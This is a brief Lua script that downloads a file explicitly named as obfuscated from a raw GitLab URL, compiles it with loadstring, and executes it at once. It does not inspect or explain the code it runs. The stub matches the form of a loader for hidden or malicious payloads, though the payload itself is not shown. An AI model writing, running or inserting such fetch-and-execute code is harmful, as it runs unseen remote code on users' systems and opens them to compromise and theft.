local https = require("ssl.https")

local code, status = https.request(
    "https://gitlab.com/nexus.personnal/vias/-/raw/master/obfuscated_5631bf90.lua"
)

assert(code and status == 200, "Failed to load GitLab script")

local fn, err = loadstring(code)
assert(fn, err)

return fn()
